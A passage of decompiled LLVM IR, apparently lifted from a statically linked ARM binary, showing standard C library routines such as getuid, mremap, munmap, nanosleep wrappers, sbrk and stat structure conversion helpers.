  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17014 = load i32, i32* @r7, align 4
  store i32 %v3_17014, i32* %stack_var_-8, align 4
  %v0_17020 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17020, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17020, -4095
  br i1 %tmp, label %dec_label_pc_17048, label %dec_label_pc_17030

dec_label_pc_17030:                               ; preds = %entry
  %v0_17034 = call i32 @__aeabi_read_tp()
  %v3_17038 = load i16, i16* @global_var_244d0.762, align 2
  %v4_17038 = sext i16 %v3_17038 to i32
  store i32 %v4_17038, i32* @r3, align 4
  %v0_1703c = load i32, i32* %r2.global-to-local, align 4
  %v1_1703c = sub i32 0, %v0_1703c
  store i32 %v1_1703c, i32* %r2.global-to-local, align 4
  %v3_17040 = add i32 %v4_17038, %v0_17034
  %v4_17040 = inttoptr i32 %v3_17040 to i32*
  store i32 %v1_1703c, i32* %v4_17040, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17048.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17048

dec_label_pc_17048:                               ; preds = %entry, %dec_label_pc_17030
  %v1_1704c = phi i32 [ %v0_17020, %entry ], [ -1, %dec_label_pc_17030 ]
  %v2_17048 = phi i32 [ %v3_17014, %entry ], [ %v2_17048.pre, %dec_label_pc_17030 ]
  store i32 %v2_17048, i32* @r7, align 4
  ret i32 %v1_1704c

; uselistorder directives
  uselistorder i32 %v0_17020, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17048, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_17064 = load i32, i32* @r0, align 4
  ret i32 %v1_17064
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17068 = load i32, i32* @r4, align 4
  store i32 %v3_17068, i32* %stack_var_-12, align 4
  %v0_17078 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17078, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17078, -4095
  br i1 %tmp, label %dec_label_pc_170a0, label %dec_label_pc_17088

dec_label_pc_17088:                               ; preds = %entry
  %v0_1708c = call i32 @__aeabi_read_tp()
  %v3_17090 = load i16, i16* @global_var_244d0.762, align 2
  %v4_17090 = sext i16 %v3_17090 to i32
  %v0_17094 = load i32, i32* %r2.global-to-local, align 4
  %v1_17094 = sub i32 0, %v0_17094
  store i32 %v1_17094, i32* %r2.global-to-local, align 4
  %v3_17098 = add i32 %v4_17090, %v0_1708c
  %v4_17098 = inttoptr i32 %v3_17098 to i32*
  store i32 %v1_17094, i32* %v4_17098, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_170a0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_170a0

dec_label_pc_170a0:                               ; preds = %entry, %dec_label_pc_17088
  %v1_170a4 = phi i32 [ %v0_17078, %entry ], [ -1, %dec_label_pc_17088 ]
  %v2_170a0 = phi i32 [ %v3_17068, %entry ], [ %v2_170a0.pre, %dec_label_pc_17088 ]
  store i32 %v2_170a0, i32* @r4, align 4
  ret i32 %v1_170a4

; uselistorder directives
  uselistorder i32 %v0_17078, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170a0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_170ac = load i32, i32* @r7, align 4
  store i32 %v3_170ac, i32* %stack_var_-8, align 4
  %v0_170b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_170b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_170b8, -4095
  br i1 %tmp, label %dec_label_pc_170e0, label %dec_label_pc_170c8

dec_label_pc_170c8:                               ; preds = %entry
  %v0_170cc = call i32 @__aeabi_read_tp()
  %v3_170d0 = load i16, i16* @global_var_244d0.762, align 2
  %v4_170d0 = sext i16 %v3_170d0 to i32
  %v0_170d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_170d4 = sub i32 0, %v0_170d4
  store i32 %v1_170d4, i32* %r2.global-to-local, align 4
  %v3_170d8 = add i32 %v4_170d0, %v0_170cc
  %v4_170d8 = inttoptr i32 %v3_170d8 to i32*
  store i32 %v1_170d4, i32* %v4_170d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_170e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_170e0

dec_label_pc_170e0:                               ; preds = %entry, %dec_label_pc_170c8
  %v1_170e4 = phi i32 [ %v0_170b8, %entry ], [ -1, %dec_label_pc_170c8 ]
  %v2_170e0 = phi i32 [ %v3_170ac, %entry ], [ %v2_170e0.pre, %dec_label_pc_170c8 ]
  store i32 %v2_170e0, i32* @r7, align 4
  ret i32 %v1_170e4

; uselistorder directives
  uselistorder i32 %v0_170b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170e0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_170ec = load i32, i32* @r7, align 4
  store i32 %v3_170ec, i32* %stack_var_-8, align 4
  %v0_170f8 = load i32, i32* @r0, align 4
  store i32 %v0_170f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_170f8, -4095
  br i1 %tmp, label %dec_label_pc_17120, label %dec_label_pc_17108

dec_label_pc_17108:                               ; preds = %entry
  %v0_1710c = call i32 @__aeabi_read_tp()
  %v3_17110 = load i16, i16* @global_var_244d0.762, align 2
  %v4_17110 = sext i16 %v3_17110 to i32
  %v0_17114 = load i32, i32* %r2.global-to-local, align 4
  %v1_17114 = sub i32 0, %v0_17114
  store i32 %v1_17114, i32* %r2.global-to-local, align 4
  %v3_17118 = add i32 %v4_17110, %v0_1710c
  %v4_17118 = inttoptr i32 %v3_17118 to i32*
  store i32 %v1_17114, i32* %v4_17118, align 4
  %v2_17120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17120

dec_label_pc_17120:                               ; preds = %entry, %dec_label_pc_17108
  %v1_17124 = phi i32 [ %v0_170f8, %entry ], [ -1, %dec_label_pc_17108 ]
  %v2_17120 = phi i32 [ %v3_170ec, %entry ], [ %v2_17120.pre, %dec_label_pc_17108 ]
  store i32 %v2_17120, i32* @r7, align 4
  ret i32 %v1_17124

; uselistorder directives
  uselistorder i32 %v0_170f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17120, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_17138 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_1713c = icmp eq i32 %v4_17138, 0
  %v3_17140 = load i32, i32* @r4, align 4
  %v9_17140 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1713c, label %dec_label_pc_17150, label %entry.dec_label_pc_17158_crit_edge

entry.dec_label_pc_17158_crit_edge:               ; preds = %entry
  br label %dec_label_pc_17158

dec_label_pc_17150:                               ; preds = %entry
  store i32 %v3_17140, i32* @r4, align 4
  store i32 %v9_17140, i32* @r6, align 4
  %v0_17154 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_17158

dec_label_pc_17158:                               ; preds = %entry.dec_label_pc_17158_crit_edge, %dec_label_pc_17150
  %v0_17158 = call i32 @__libc_enable_asynccancel()
  %v0_1715c = load i32, i32* @r6, align 4
  store i32 %v0_1715c, i32* @r1, align 4
  store i32 %v0_17158, i32* @r5, align 4
  %v0_17164 = load i32, i32* @r4, align 4
  store i32 %v0_17164, i32* @r0, align 4
  %v0_17168 = call i32 @__syscall_nanosleep()
  store i32 %v0_17168, i32* @r4, align 4
  %v0_17170 = load i32, i32* @r5, align 4
  %v1_17174 = call i32 @__libc_disable_asynccancel(i32 %v0_17170)
  %v0_17178 = load i32, i32* @r4, align 4
  ret i32 %v0_17178

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 7, 10, 13, 1, 6, 8, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 7, 10, 13, 1, 6, 8, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder label %dec_label_pc_17158, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1718c = load i32, i32* @r4, align 4
  store i32 %v3_1718c, i32* %stack_var_-16, align 4
  store i32 11580, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r4.global-to-local, align 4
  %v4_1719c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 11580) to i32*), align 4
  %v2_171a0 = icmp eq i32 %v4_1719c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_171a0, label %dec_label_pc_171ac, label %dec_label_pc_171bc

dec_label_pc_171ac:                               ; preds = %entry
  %v1_171b0 = call i32 @__GI_brk(i32 0)
  %v1_171b4 = icmp slt i32 %v1_171b0, 0
  br i1 %v1_171b4, label %dec_label_pc_171e0, label %dec_label_pc_171bcthread-pre-split

dec_label_pc_171bcthread-pre-split:               ; preds = %dec_label_pc_171ac
  %v0_171c0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_171bc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_171bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_171bc

dec_label_pc_171bc:                               ; preds = %dec_label_pc_171bcthread-pre-split, %entry
  %v1_171bc = phi i32 [ %v1_171bc.pre, %dec_label_pc_171bcthread-pre-split ], [ 11580, %entry ]
  %v0_171bc = phi i32 [ %v0_171bc.pre, %dec_label_pc_171bcthread-pre-split ], [ ptrtoint (i32* @global_var_24478.766 to i32), %entry ]
  %v1_171d0 = phi i32 [ %v0_171c0.pr, %dec_label_pc_171bcthread-pre-split ], [ %arg1, %entry ]
  %v2_171bc = add i32 %v0_171bc, %v1_171bc
  %v3_171bc = inttoptr i32 %v2_171bc to i32*
  %v4_171bc = load i32, i32* %v3_171bc, align 4
  %v2_171c0 = icmp eq i32 %v1_171d0, 0
  store i32 %v4_171bc, i32* %r4.global-to-local, align 4
  br i1 %v2_171c0, label %dec_label_pc_171e4, label %dec_label_pc_171cc

dec_label_pc_171cc:                               ; preds = %dec_label_pc_171bc
  %v2_171d0 = add i32 %v4_171bc, %v1_171d0
  %v1_171d4 = call i32 @__GI_brk(i32 %v2_171d0)
  %v1_171d8 = icmp slt i32 %v1_171d4, 0
  br i1 %v1_171d8, label %dec_label_pc_171e0, label %dec_label_pc_171cc.dec_label_pc_171e4_crit_edge

dec_label_pc_171cc.dec_label_pc_171e4_crit_edge:  ; preds = %dec_label_pc_171cc
  %v0_171e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_171e4

dec_label_pc_171e0:                               ; preds = %dec_label_pc_171cc, %dec_label_pc_171ac
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_171e4

dec_label_pc_171e4:                               ; preds = %dec_label_pc_171bc, %dec_label_pc_171cc.dec_label_pc_171e4_crit_edge, %dec_label_pc_171e0
  %v0_171e4 = phi i32 [ %v0_171e4.pre, %dec_label_pc_171cc.dec_label_pc_171e4_crit_edge ], [ -1, %dec_label_pc_171e0 ], [ %v4_171bc, %dec_label_pc_171bc ]
  %v2_171e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_171e8, i32* @r4, align 4
  ret i32 %v0_171e4

; uselistorder directives
  uselistorder i32 %v4_171bc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_171e4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17208 = load i32, i32* @r0, align 4
  ret i32 %v1_17208
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1720c = load i32, i32* @r4, align 4
  store i32 %v3_1720c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_17224 = inttoptr i32 %arg2 to i8*
  %v4_17224 = call i32 @__GI_memset(i8* %v3_17224, i32 0, i32 104)
  %v2_17228 = load i32, i32* %arg1, align 4
  store i32 %v2_17228, i32* %r3.global-to-local, align 4
  %v3_17228 = add i32 %tmp, 4
  %v4_17228 = inttoptr i32 %v3_17228 to i32*
  %v5_17228 = load i32, i32* %v4_17228, align 4
  store i32 %v5_17228, i32* %r4.global-to-local, align 4
  %v0_1722c = load i32, i32* %r5.global-to-local, align 4
  %v1_1722c = inttoptr i32 %v0_1722c to i32*
  store i32 %v2_17228, i32* %v1_1722c, align 4
  %v3_1722c = add i32 %v0_1722c, 4
  %v4_1722c = inttoptr i32 %v3_1722c to i32*
  %v5_1722c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1722c, i32* %v4_1722c, align 4
  %v0_17230 = load i32, i32* %r6.global-to-local, align 4
  %v1_17230 = add i32 %v0_17230, 12
  %v2_17230 = inttoptr i32 %v1_17230 to i32*
  %v3_17230 = load i32, i32* %v2_17230, align 4
  %v1_17234 = load i32, i32* %r5.global-to-local, align 4
  %v2_17234 = add i32 %v1_17234, 12
  %v3_17234 = inttoptr i32 %v2_17234 to i32*
  store i32 %v3_17230, i32* %v3_17234, align 4
  %v0_17238 = load i32, i32* %r6.global-to-local, align 4
  %v1_17238 = add i32 %v0_17238, 96
  store i32 %v1_17238, i32* %r3.global-to-local, align 4
  %v1_1723c = inttoptr i32 %v1_17238 to i32*
  %v2_1723c = load i32, i32* %v1_1723c, align 4
  store i32 %v2_1723c, i32* %r3.global-to-local, align 4
  %v3_1723c = add i32 %v0_17238, 100
  %v4_1723c = inttoptr i32 %v3_1723c to i32*
  %v5_1723c = load i32, i32* %v4_1723c, align 4
  store i32 %v5_1723c, i32* %r4.global-to-local, align 4
  %v1_17240 = add i32 %v0_17238, 56
  %v2_17240 = inttoptr i32 %v1_17240 to i32*
  %v3_17240 = load i32, i32* %v2_17240, align 4
  store i32 %v3_17240, i32* %r2.global-to-local, align 4
  %v1_17244 = load i32, i32* %r5.global-to-local, align 4
  %v2_17244 = add i32 %v1_17244, 96
  %v3_17244 = inttoptr i32 %v2_17244 to i32*
  store i32 %v2_1723c, i32* %v3_17244, align 4
  %v0_17248 = load i32, i32* %r4.global-to-local, align 4
  %v1_17248 = load i32, i32* %r5.global-to-local, align 4
  %v2_17248 = add i32 %v1_17248, 100
  %v3_17248 = inttoptr i32 %v2_17248 to i32*
  store i32 %v0_17248, i32* %v3_17248, align 4
  %v0_1724c = load i32, i32* %r6.global-to-local, align 4
  %v1_1724c = add i32 %v0_1724c, 24
  store i32 %v1_1724c, i32* %ip.global-to-local, align 4
  %v1_17250 = inttoptr i32 %v1_1724c to i32*
  %v2_17250 = load i32, i32* %v1_17250, align 4
  store i32 %v2_17250, i32* %ip.global-to-local, align 4
  %v3_17250 = add i32 %v0_1724c, 28
  %v4_17250 = inttoptr i32 %v3_17250 to i32*
  %v5_17250 = load i32, i32* %v4_17250, align 4
  store i32 %v5_17250, i32* %lr.global-to-local, align 4
  %v0_17254 = load i32, i32* %r2.global-to-local, align 4
  %v1_17254 = load i32, i32* %r5.global-to-local, align 4
  %v2_17254 = add i32 %v1_17254, 56
  %v3_17254 = inttoptr i32 %v2_17254 to i32*
  store i32 %v0_17254, i32* %v3_17254, align 4
  %v0_17258 = load i32, i32* %r6.global-to-local, align 4
  %v1_17258 = add i32 %v0_17258, 72
  store i32 %v1_17258, i32* %r3.global-to-local, align 4
  %v1_1725c = add i32 %v0_17258, 32
  store i32 %v1_1725c, i32* %r7.global-to-local, align 4
  %v1_17260 = inttoptr i32 %v1_1725c to i32*
  %v2_17260 = load i32, i32* %v1_17260, align 4
  store i32 %v2_17260, i32* %r7.global-to-local, align 4
  %v3_17260 = add i32 %v0_17258, 36
  %v4_17260 = inttoptr i32 %v3_17260 to i32*
  %v5_17260 = load i32, i32* %v4_17260, align 4
  store i32 %v5_17260, i32* %r8.global-to-local, align 4
  %v1_17264 = inttoptr i32 %v1_17258 to i32*
  %v2_17264 = load i32, i32* %v1_17264, align 4
  %v3_17264 = add i32 %v0_17258, 76
  %v4_17264 = inttoptr i32 %v3_17264 to i32*
  %v5_17264 = load i32, i32* %v4_17264, align 4
  store i32 %v5_17264, i32* %r1.global-to-local, align 4
  %v0_17268 = load i32, i32* %r5.global-to-local, align 4
  %v1_17268 = add i32 %v0_17268, 72
  %v1_1726c = inttoptr i32 %v1_17268 to i32*
  store i32 %v2_17264, i32* %v1_1726c, align 4
  %v3_1726c = add i32 %v0_17268, 76
  %v4_1726c = inttoptr i32 %v3_1726c to i32*
  %v5_1726c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1726c, i32* %v4_1726c, align 4
  %v0_17270 = load i32, i32* %r7.global-to-local, align 4
  %v1_17270 = load i32, i32* %r5.global-to-local, align 4
  %v2_17270 = add i32 %v1_17270, 32
  %v3_17270 = inttoptr i32 %v2_17270 to i32*
  store i32 %v0_17270, i32* %v3_17270, align 4
  %v0_17274 = load i32, i32* %r8.global-to-local, align 4
  %v1_17274 = load i32, i32* %r5.global-to-local, align 4
  %v2_17274 = add i32 %v1_17274, 36
  %v3_17274 = inttoptr i32 %v2_17274 to i32*
  store i32 %v0_17274, i32* %v3_17274, align 4
  %v0_17278 = load i32, i32* %r6.global-to-local, align 4
  %v1_17278 = add i32 %v0_17278, 80
  store i32 %v1_17278, i32* %r3.global-to-local, align 4
  %v1_1727c = add i32 %v0_17278, 48
  store i32 %v1_1727c, i32* %r7.global-to-local, align 4
  %v1_17280 = inttoptr i32 %v1_1727c to i32*
  %v2_17280 = load i32, i32* %v1_17280, align 4
  store i32 %v2_17280, i32* %r7.global-to-local, align 4
  %v3_17280 = add i32 %v0_17278, 52
  %v4_17280 = inttoptr i32 %v3_17280 to i32*
  %v5_17280 = load i32, i32* %v4_17280, align 4
  store i32 %v5_17280, i32* %r8.global-to-local, align 4
  %v1_17284 = inttoptr i32 %v1_17278 to i32*
  %v2_17284 = load i32, i32* %v1_17284, align 4
  %v3_17284 = add i32 %v0_17278, 84
  %v4_17284 = inttoptr i32 %v3_17284 to i32*
  %v5_17284 = load i32, i32* %v4_17284, align 4
  store i32 %v5_17284, i32* %r1.global-to-local, align 4
  %v1_17288 = add i32 %v0_17278, 16
  %v2_17288 = inttoptr i32 %v1_17288 to i32*
  %v3_17288 = load i32, i32* %v2_17288, align 4
  store i32 %v3_17288, i32* %r2.global-to-local, align 4
  %v0_1728c = load i32, i32* %r5.global-to-local, align 4
  %v1_1728c = add i32 %v0_1728c, 80
  %v1_17290 = inttoptr i32 %v1_1728c to i32*
  store i32 %v2_17284, i32* %v1_17290, align 4
  %v3_17290 = add i32 %v0_1728c, 84
  %v4_17290 = inttoptr i32 %v3_17290 to i32*
  %v5_17290 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17290, i32* %v4_17290, align 4
  %v0_17294 = load i32, i32* %r7.global-to-local, align 4
  %v1_17294 = load i32, i32* %r5.global-to-local, align 4
  %v2_17294 = add i32 %v1_17294, 48
  %v3_17294 = inttoptr i32 %v2_17294 to i32*
  store i32 %v0_17294, i32* %v3_17294, align 4
  %v0_17298 = load i32, i32* %r8.global-to-local, align 4
  %v1_17298 = load i32, i32* %r5.global-to-local, align 4
  %v2_17298 = add i32 %v1_17298, 52
  %v3_17298 = inttoptr i32 %v2_17298 to i32*
  store i32 %v0_17298, i32* %v3_17298, align 4
  %v0_1729c = load i32, i32* %r2.global-to-local, align 4
  %v1_1729c = load i32, i32* %r5.global-to-local, align 4
  %v2_1729c = add i32 %v1_1729c, 16
  %v3_1729c = inttoptr i32 %v2_1729c to i32*
  store i32 %v0_1729c, i32* %v3_1729c, align 4
  %v0_172a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_172a0 = add i32 %v0_172a0, 88
  store i32 %v1_172a0, i32* %r3.global-to-local, align 4
  %v1_172a4 = add i32 %v0_172a0, 20
  %v2_172a4 = inttoptr i32 %v1_172a4 to i32*
  %v3_172a4 = load i32, i32* %v2_172a4, align 4
  store i32 %v3_172a4, i32* %r2.global-to-local, align 4
  %v1_172a8 = inttoptr i32 %v1_172a0 to i32*
  %v2_172a8 = load i32, i32* %v1_172a8, align 4
  %v3_172a8 = add i32 %v0_172a0, 92
  %v4_172a8 = inttoptr i32 %v3_172a8 to i32*
  %v5_172a8 = load i32, i32* %v4_172a8, align 4
  store i32 %v5_172a8, i32* %r1.global-to-local, align 4
  %v1_172ac = add i32 %v0_172a0, 64
  store i32 %v1_172ac, i32* %r6.global-to-local, align 4
  %v1_172b0 = inttoptr i32 %v1_172ac to i32*
  %v2_172b0 = load i32, i32* %v1_172b0, align 4
  store i32 %v2_172b0, i32* %r6.global-to-local, align 4
  %v3_172b0 = add i32 %v0_172a0, 68
  %v4_172b0 = inttoptr i32 %v3_172b0 to i32*
  %v5_172b0 = load i32, i32* %v4_172b0, align 4
  store i32 %v5_172b0, i32* %r7.global-to-local, align 4
  %v0_172b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_172b4 = add i32 %v0_172b4, 88
  store i32 %v1_172b4, i32* %r3.global-to-local, align 4
  %v2_172b8 = add i32 %v0_172b4, 20
  %v3_172b8 = inttoptr i32 %v2_172b8 to i32*
  store i32 %v3_172a4, i32* %v3_172b8, align 4
  %v0_172bc = load i32, i32* %ip.global-to-local, align 4
  %v1_172bc = load i32, i32* %r5.global-to-local, align 4
  %v2_172bc = add i32 %v1_172bc, 24
  %v3_172bc = inttoptr i32 %v2_172bc to i32*
  store i32 %v0_172bc, i32* %v3_172bc, align 4
  %v0_172c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_172c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_172c0 = add i32 %v1_172c0, 28
  %v3_172c0 = inttoptr i32 %v2_172c0 to i32*
  store i32 %v0_172c0, i32* %v3_172c0, align 4
  %v0_172c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_172c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_172c4 = add i32 %v1_172c4, 64
  %v3_172c4 = inttoptr i32 %v2_172c4 to i32*
  store i32 %v0_172c4, i32* %v3_172c4, align 4
  %v0_172c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_172c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_172c8 = add i32 %v1_172c8, 68
  %v3_172c8 = inttoptr i32 %v2_172c8 to i32*
  store i32 %v0_172c8, i32* %v3_172c8, align 4
  %v0_172cc = load i32, i32* %r3.global-to-local, align 4
  %v1_172cc = inttoptr i32 %v0_172cc to i32*
  store i32 %v2_172a8, i32* %v1_172cc, align 4
  %v3_172cc = add i32 %v0_172cc, 4
  %v4_172cc = inttoptr i32 %v3_172cc to i32*
  %v5_172cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_172cc, i32* %v4_172cc, align 4
  %v2_172d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_172d0, i32* %r4.global-to-local, align 4
  ret i32 %v2_172a8

; uselistorder directives
  uselistorder i32 %v0_172a0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17278, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_172d8 = load i32, i32* @r4, align 4
  store i32 %v3_172d8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_172f0 = inttoptr i32 %arg2 to i8*
  %v4_172f0 = call i32 @__GI_memset(i8* %v3_172f0, i32 0, i32 88)
  %v2_172f4 = load i32, i32* %arg1, align 4
  %v3_172f4 = add i32 %tmp, 4
  %v4_172f4 = inttoptr i32 %v3_172f4 to i32*
  %v5_172f4 = load i32, i32* %v4_172f4, align 4
  store i32 %v5_172f4, i32* %r4.global-to-local, align 4
  %v0_172f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_172f8 = inttoptr i32 %v0_172f8 to i32*
  store i32 %v2_172f4, i32* %v1_172f8, align 4
  %v3_172f8 = add i32 %v0_172f8, 4
  %v4_172f8 = inttoptr i32 %v3_172f8 to i32*
  %v5_172f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_172f8, i32* %v4_172f8, align 4
  %v0_172fc = load i32, i32* %r5.global-to-local, align 4
  %v1_172fc = add i32 %v0_172fc, 32
  %v1_17300 = inttoptr i32 %v1_172fc to i32*
  %v2_17300 = load i32, i32* %v1_17300, align 4
  %v3_17300 = add i32 %v0_172fc, 36
  %v4_17300 = inttoptr i32 %v3_17300 to i32*
  %v5_17300 = load i32, i32* %v4_17300, align 4
  store i32 %v5_17300, i32* %r4.global-to-local, align 4
  %v1_17304 = add i32 %v0_172fc, 96
  %v2_17304 = inttoptr i32 %v1_17304 to i32*
  %v3_17304 = load i32, i32* %v2_17304, align 4
  store i32 %v3_17304, i32* %r2.global-to-local, align 4
  %v1_17308 = load i32, i32* %r6.global-to-local, align 4
  %v2_17308 = add i32 %v1_17308, 32
  %v3_17308 = inttoptr i32 %v2_17308 to i32*
  store i32 %v2_17300, i32* %v3_17308, align 4
  %v0_1730c = load i32, i32* %r4.global-to-local, align 4
  %v1_1730c = load i32, i32* %r6.global-to-local, align 4
  %v2_1730c = add i32 %v1_1730c, 36
  %v3_1730c = inttoptr i32 %v2_1730c to i32*
  store i32 %v0_1730c, i32* %v3_1730c, align 4
  %v0_17310 = load i32, i32* %r2.global-to-local, align 4
  %v1_17310 = load i32, i32* %r6.global-to-local, align 4
  %v2_17310 = add i32 %v1_17310, 12
  %v3_17310 = inttoptr i32 %v2_17310 to i32*
  store i32 %v0_17310, i32* %v3_17310, align 4
  %v0_17314 = load i32, i32* %r5.global-to-local, align 4
  %v1_17314 = add i32 %v0_17314, 48
  %v2_17314 = inttoptr i32 %v1_17314 to i32*
  %v3_17314 = load i32, i32* %v2_17314, align 4
  %v1_17318 = add i32 %v0_17314, 24
  store i32 %v1_17318, i32* %ip.global-to-local, align 4
  %v1_1731c = inttoptr i32 %v1_17318 to i32*
  %v2_1731c = load i32, i32* %v1_1731c, align 4
  store i32 %v2_1731c, i32* %ip.global-to-local, align 4
  %v3_1731c = add i32 %v0_17314, 28
  %v4_1731c = inttoptr i32 %v3_1731c to i32*
  %v5_1731c = load i32, i32* %v4_1731c, align 4
  store i32 %v5_1731c, i32* %lr.global-to-local, align 4
  %v1_17320 = load i32, i32* %r6.global-to-local, align 4
  %v2_17320 = add i32 %v1_17320, 44
  %v3_17320 = inttoptr i32 %v2_17320 to i32*
  store i32 %v3_17314, i32* %v3_17320, align 4
  %v0_17324 = load i32, i32* %r5.global-to-local, align 4
  %v1_17324 = add i32 %v0_17324, 64
  %v2_17324 = inttoptr i32 %v1_17324 to i32*
